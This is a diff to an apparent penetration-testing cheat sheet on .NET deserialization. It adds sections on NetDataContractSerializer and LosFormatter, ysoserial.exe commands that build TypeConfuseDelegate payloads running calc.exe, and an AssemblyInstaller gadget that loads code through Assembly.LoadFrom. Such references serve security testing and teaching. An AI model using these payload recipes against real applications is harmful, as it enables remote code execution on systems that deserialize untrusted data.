@@ -5,10 +5,12 @@
 * [Detection](#detection)
 * [Tools](#tools)
 * [Formatters](#formatters)
-    * [XmlSerializer](#)
-    * [DataContractSerializer](#)
-    * [JSON.NET](#)
-    * [BinaryFormatter](#)
+    * [XmlSerializer](#xmlserializer)
+    * [DataContractSerializer](#datacontractserializer)
+    * [NetDataContractSerializer](#netdatacontractserializer)
+    * [LosFormatter](#losformatter)
+    * [JSON.NET](#jsonnet)
+    * [BinaryFormatter](#binaryformatter)
 * [POP Gadgets](#pop-gadgets)
 * [References](#references)
 
@@ -73,11 +75,21 @@ $ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
 
 ### NetDataContractSerializer 
 
+> It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable of serializing any type annotated with serializable attribute as `BinaryFormatter`.
+
 * In C# source code, look for `NetDataContractSerializer().ReadObject()`.
 * Payload output: **XML**
 
 ```ps1
 .\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
+```
+
+### LosFormatter
+
+* Use `BinaryFormatter` internally.
+
+```ps1
+.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
 ```
 
 
@@ -131,6 +143,17 @@ List of popular gadgets used in common payloads.
     * Specify the `object types` of the objects that are encapsulated
     ```cs
     ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
+    ```
+* **System.Configuration.Install.AssemblyInstaller**
+    * Execute payload with Assembly.Load   
+    ```cs
+    // System.Configuration.Install.AssemblyInstaller
+    public void set_Path(string value){
+        if (value == null){
+            this.assembly = null;
+        }
+        this.assembly = Assembly.LoadFrom(value);
+    }
     ```
 
 
